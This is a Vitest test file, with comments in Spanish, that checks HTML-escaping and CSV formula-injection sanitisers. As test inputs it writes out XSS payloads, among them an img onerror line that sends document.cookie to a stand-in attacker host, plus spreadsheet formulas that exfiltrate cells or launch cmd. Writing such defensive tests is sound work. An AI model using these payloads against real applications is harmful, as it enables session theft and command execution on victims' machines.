import { describe, it, expect } from "vitest";
import { escapeHtml, sanitizeCsvValue, toCsvCell } from "./sanitize";

describe("escapeHtml", () => {
  it("neutraliza una etiqueta script inyectada", () => {
    expect(escapeHtml('<script>alert(1)</script>')).toBe(
      "&lt;script&gt;alert(1)&lt;/script&gt;"
    );
  });

  it("neutraliza el vector real: un nombre de usuario con onerror", () => {
    // Este es el payload que se ejecutaría en el informe del evento, en el
    // mismo origen que la aplicación y con acceso a la sesión de Supabase.
    const escapado = escapeHtml('<img src=x onerror=fetch("//atacante/"+document.cookie)>');

    // Lo que importa no es que desaparezca la palabra "onerror", sino que no
    // sobreviva ningun delimitador con el que el navegador pueda formar una
    // etiqueta: el payload queda como texto visible e inerte.
    expect(escapado).not.toMatch(/[<>]/);
    expect(escapado).toContain("&lt;img");

    // Y al insertarlo en un documento real no se crea ningun elemento.
    const contenedor = document.createElement("div");
    contenedor.innerHTML = `<div>${escapado}</div>`;
    expect(contenedor.querySelector("img")).toBeNull();
    expect(contenedor.textContent).toContain("<img src=x");
  });

  it("impide escapar de un atributo con comillas", () => {
    expect(escapeHtml('" onmouseover="alert(1)')).toBe(
      "&quot; onmouseover=&quot;alert(1)"
    );
  });

  it("escapa el ampersand antes que el resto, sin doble codificación", () => {
    expect(escapeHtml("Tom & Jerry")).toBe("Tom &amp; Jerry");
    expect(escapeHtml("<")).toBe("&lt;");
  });

  it("deja intacto el texto legítimo, incluidos los acentos", () => {
    expect(escapeHtml("María Fernández-Gómez")).toBe("María Fernández-Gómez");
  });

  it("convierte null y undefined en cadena vacía", () => {
    expect(escapeHtml(null)).toBe("");
    expect(escapeHtml(undefined)).toBe("");
  });

  it("acepta valores no textuales", () => {
    expect(escapeHtml(42)).toBe("42");
    expect(escapeHtml(false)).toBe("false");
  });
});

describe("sanitizeCsvValue", () => {
  it.each([
    ['=HYPERLINK("http://atacante/"&A1,"clic")', "="],
    ["+1+1", "+"],
    ["@SUM(A1:A9)", "@"],
    ["-2+3+cmd|' /c calc'!A0", "-"],
  ])("neutraliza la fórmula que empieza por %s", (payload) => {
    const salida = sanitizeCsvValue(payload);
    expect(salida.startsWith("'")).toBe(true);
    expect(salida.slice(1)).toBe(payload);
  });

  it("no altera los números negativos legítimos", () => {
    // Sin esta excepción, la columna de confianza se convertiría en texto.
    expect(sanitizeCsvValue("-0.87")).toBe("-0.87");
    expect(sanitizeCsvValue("-12")).toBe("-12");
  });

  it("no altera fechas ni texto normal", () => {
    expect(sanitizeCsvValue("2026-09-13T04:15:00Z")).toBe("2026-09-13T04:15:00Z");
    expect(sanitizeCsvValue("entrada_principal")).toBe("entrada_principal");
    expect(sanitizeCsvValue("")).toBe("");
  });
});

describe("toCsvCell", () => {
  it("envuelve en comillas y duplica las comillas internas", () => {
    expect(toCsvCell('dijo "hola"')).toBe('"dijo ""hola"""');
  });

  it("mantiene las comas dentro de una sola celda", () => {
    expect(toCsvCell("Gómez, María")).toBe('"Gómez, María"');
  });

  it("serializa los objetos, como metricas_json", () => {
    expect(toCsvCell({ varianza: 1.2 })).toBe('"{""varianza"":1.2}"');
  });

  it("aplica también la protección contra fórmulas", () => {
    expect(toCsvCell("=1+1")).toBe(`"'=1+1"`);
  });

  it("representa null y undefined como celda vacía", () => {
    expect(toCsvCell(null)).toBe('""');
    expect(toCsvCell(undefined)).toBe('""');
  });
});
